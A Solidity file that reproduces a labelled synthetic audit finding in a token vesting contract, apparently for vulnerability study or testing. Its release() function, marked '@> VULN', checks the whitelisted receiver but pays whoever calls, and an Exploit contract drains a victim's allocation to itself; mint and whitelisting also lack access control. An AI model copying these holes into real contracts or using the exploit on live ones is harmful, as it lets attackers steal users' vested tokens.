// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Global Interlink token vesting release (Zokyo, Mar 2023, finding #44578).
    SYNTHETIC, cheatcode-free. release checks the whitelisted receiver, then
    pays msg.sender (@> VULN). The caller takes 1000. The receiver gets 0.
    releaseToReceiver pays the whitelisted account instead. */

contract GilToken {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

contract TokenVesting {
    GilToken public immutable token;
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public allocation;
    mapping(address => uint256) public released;

    constructor(GilToken token_) {
        token = token_;
    }

    function addToWhitelist(address receiver, uint256 amount) external {
        whitelisted[receiver] = true;
        allocation[receiver] = amount;
    }

    function release(address receiver) external returns (uint256 amount) {
        require(whitelisted[receiver], "whitelist");
        amount = allocation[receiver] - released[receiver];
        require(amount > 0, "zero");
        released[receiver] = allocation[receiver];
        // @> VULN: the transfer pays the caller, not the whitelisted receiver.
        token.transfer(msg.sender, amount);
    }

    function releaseToReceiver(address receiver) external returns (uint256 amount) {
        require(whitelisted[receiver], "whitelist");
        amount = allocation[receiver] - released[receiver];
        require(amount > 0, "zero");
        released[receiver] = allocation[receiver];
        token.transfer(receiver, amount);
    }
}

contract Exploit {
    GilToken public token; // nonce 1
    TokenVesting public vest; // nonce 2
    address public constant VICTIM = address(0xBEEF);

    constructor() {
        token = new GilToken();
        vest = new TokenVesting(token);
        vest.addToWhitelist(VICTIM, 1000);
        token.mint(address(vest), 1000);
    }

    function run() external {
        require(vest.whitelisted(VICTIM), "victim whitelisted");
        require(vest.allocation(VICTIM) == 1000, "allocation 1000");
        uint256 paid = vest.release(VICTIM);
        require(paid == 1000, "caller paid 1000");
        require(token.balanceOf(address(this)) == 1000, "sender took the release");
        require(token.balanceOf(VICTIM) == 0, "receiver got nothing");
        require(token.balanceOf(address(vest)) == 0, "vesting emptied");
    }
}
